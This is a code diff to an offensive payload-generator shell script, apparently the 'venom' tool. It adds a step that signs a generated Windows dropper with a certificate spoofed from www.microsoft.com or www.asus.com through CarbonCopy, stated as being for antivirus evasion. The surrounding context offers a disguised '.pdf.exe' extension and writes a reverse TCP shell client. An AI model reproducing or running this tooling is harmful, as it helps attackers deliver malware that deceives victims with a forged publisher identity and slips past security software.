@@ -13006,6 +13006,32 @@ wine "$multiwine" -open "$IPATH/output/$Drop.exe" -save "$IPATH/output/$Drop.exe
 ## Spoof dropper extension ? (dropper.pdf.exe OR dropper.exe ?)
 Spoof=$(zenity --list --title "☠ SPOOF DROPPER EXTENSION ? ☠" --text "\nDo you wish to Spoof dropper.exe extension ? (dropper.pdf.exe)\nWarning: Spoofing dropper.exe extension migth flag AV detection." --radiolist --column "Pick" --column "Option" TRUE "$Drop.exe (default)" FALSE "$Drop.pdf.exe (spoof)") > /dev/null 2>&1
 if [ "$Spoof" = "$Drop.pdf.exe (spoof)" ]; then echo "${BlueF}[${YellowF}i${BlueF}]${white} Spoofing dropper.exe extension (.pdf.exe)"${Reset};sleep 2;fi
+
+
+## SIGN EXECUTABLE (paranoidninja - CarbonCopy)
+easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
+if [ "$easter_egg" = "ON" ]; then
+
+   ## Make sure CarbonCopy dependencies are installed
+   ossl_packer=`which osslsigncode`
+   if [ "$?" -ne "0" ]; then
+      echo "${RedF}[x]${white} osslsigncode Package not found, installing .."${Reset};sleep 2
+      echo "" && sudo apt-get install osslsigncode && pip3 install pyopenssl && echo ""
+   fi
+
+   ## SIGN EXECUTABLE (paranoidninja - CarbonCopy)
+   echo "${BlueF}[☠]${white} Sign Executable for AV Evasion (CarbonCopy) .."${Reset};sleep 2
+   conv=$(cat /dev/urandom | tr -dc '1-6' | fold -w 1 | head -n 1)
+   if [ "$conv" "<" "3" ]; then SSL_domain="www.microsoft.com"; else SSL_domain="www.asus.com";fi
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} spoofed certificate:${BlueF} $SSL_domain"${Reset};sleep 2
+   cd $IPATH/obfuscate
+   xterm -T "VENOM - Signs an Executable for AV Evasion" -geometry 110x23 -e "python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/$Drop.exe $IPATH/output/signed-$Drop.exe && sleep 2"
+   mv $IPATH/output/signed-$Drop.exe $IPATH/output/$Drop.exe
+   rm -r certs > /dev/nul 2>&1
+   chmod +x $IPATH/output/$Drop.exe > /dev/nul 2>&1
+   cd $IPATH/
+
+fi
 echo "${BlueF}[☠]${white} Writting Client rev tcp shell to output."${Reset};sleep 2
 
 
